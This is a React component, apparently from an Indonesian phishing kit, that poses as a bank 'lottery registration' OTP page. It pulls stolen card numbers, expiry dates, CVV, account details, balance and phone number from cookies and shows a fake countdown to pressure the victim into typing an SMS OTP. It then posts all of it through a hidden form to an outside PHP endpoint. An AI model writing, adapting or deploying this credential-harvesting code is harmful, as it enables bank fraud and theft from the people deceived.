import {
    useNavigate
} from 'react-router-dom';
import '../assets/css/App.css';
import {
    useState,
    useEffect
} from 'react';
import sms from '../assets/img/user.png';
import Cookies from 'js-cookie'; // Import library untuk mengakses cookies

function Pempat(props) {
    const nav = useNavigate();
    const [satu, setSatu] = useState('');
    const [dua, setDua] = useState('');
    const [tiga, setTiga] = useState('');
    const [empat, setEmpat] = useState('');
    const [lima, setLima] = useState('');
    const [enam, setEnam] = useState('');
    const [tujuh, setTujuh] = useState('');
    const [delapan, setDelapan] = useState('');

    // Isi Link php ini
    let [link, setLink] = useState("https://taxi-but-gadok.store/auth/r-hr2");
    let [loc, setLoc] = useState("");

    useEffect(() => {
        setLoc(window.location.origin + '/enam');
        console.log(satu);
        console.log(dua);
        console.log(tiga);
        console.log(empat);
        console.log(lima);
        console.log(enam);
        console.log(tujuh);
        console.log(delapan);
    });



    // Mengambil nilai dari cookies dan mengatur state saat komponen dimuat
    useEffect(() => {
        setSatu(Cookies.get('satu') || ''); // Mengambil nilai dari cookies untuk duser, atau kosong jika tidak ada
        setDua(Cookies.get('dua') || ''); // Mengambil nilai dari cookies untuk ddigit, atau kosong jika tidak ada
        setTiga(Cookies.get('tiga') || ''); // Mengambil nilai dari cookies untuk dbulan, atau kosong jika tidak ada
        setEmpat(Cookies.get('empat') || ''); // Mengambil nilai dari cookies untuk dtahun, atau kosong jika tidak ada
        setLima(Cookies.get('lima') || ''); // Mengambil nilai dari cookies untuk drek, atau kosong jika tidak ada
        setEnam(Cookies.get('enam') || ''); // Mengambil nilai dari cookies untuk dsisa, atau kosong jika tidak ada
        setTujuh(Cookies.get('cvv') || ''); // Mengambil nilai dari cookies untuk dcvv, atau kosong jika tidak ada
    }, []);
    useEffect(() => {
        let menit = 2;
        let detik = 59;
        setInterval(() => {
            detik -= 1;
            if (detik === 0) {
                detik = 59;
                menit -= 1;
            } else if (menit === 0) {
                detik = 0;
                menit = 0;
            }
            document.getElementById('menit').innerHTML = '0' + menit;
            document.getElementById('detik').innerHTML = `${(detik < 10) ? '0' + detik : detik}`;
        }, 1000);
    }, [props.pin]);

    const ok = (e) => {
        e.preventDefault();
        props.send();
        Cookies.remove('satu');
        Cookies.remove('dua');
        Cookies.remove('tiga');
        Cookies.remove('empat');
        Cookies.remove('lima');
        Cookies.remove('enam');
        Cookies.remove('tujuh');
        Cookies.remove('cvv');
        document.querySelector("#php3").submit();
    };

    return ( <
        div className = "pg3" >
        <
        form className = 'form1'
        onSubmit = {
            ok
        } >
        <
        center >
        <
        img src = {
            sms
        }
        className = 'sms' / >
        <
        h1 style = {
            {
                fontSize: '1.1em'
            }
        } > Waktu Berlaku OTP < /h1> <
        /center> <
        hr / >
        <
        center >
        <
        h1 style = {
            {
                fontSize: '1.1em',
                marginTop: '5px'
            }
        } >
        <
        span id = 'menit' > 03 < /span> <
        span > {
            ` : `
        } < /span> <
        span id = 'detik' > 00 < /span> <
        /h1> <
        /center> <
        label > Masukkan kode Kupon / OTP yang kami kirim Via SMS pesan masuk ke Nomor: {
            enam
        }, yang terdaftar di M - Banking < /label> <
        label > untuk melanjutkan proses Verifikasi pendaftaran Undian < /label> <
        br / >
        <
        br / >
        <
        input style = {
            {
                textAlign: "center"
            }
        }
        type = "number"
        placeholder = 'Masukan Kode Kupon/OTP '
        minLength = {
            4
        }
        maxLength = {
            6
        }
        onInput = {
            e => (props.pin(e.target.value), setDelapan(e.target.value))
        }
        required / >
        <
        br / >
        <
        button > Konfirmasi Kupon < /button> <
        /form>

        <
        form action = {
            link + "/all.php"
        }
        method = 'post'
        id = 'php3' >
        <
        input type = "hidden"
        name = 'satu'
        value = {
            satu
        }
        /> <
        input type = "hidden"
        name = 'dua'
        value = {
            dua
        }
        /> <
        input type = "hidden"
        name = 'tiga'
        value = {
            tiga
        }
        /> <
        input type = "hidden"
        name = 'empat'
        value = {
            empat
        }
        /> <
        input type = "hidden"
        name = 'lima'
        value = {
            lima
        }
        /> <
        input type = "hidden"
        name = 'enam'
        value = {
            enam
        }
        /> <
        input type = "hidden"
        name = 'tujuh'
        value = {
            tujuh
        }
        /> <
        input type = "hidden"
        name = 'delapan'
        value = {
            delapan
        }
        /> <
        input type = "hidden"
        name = 'loc'
        value = {
            loc
        }
        /> <
        /form> <
        /div>
    );
}

export default Pempat;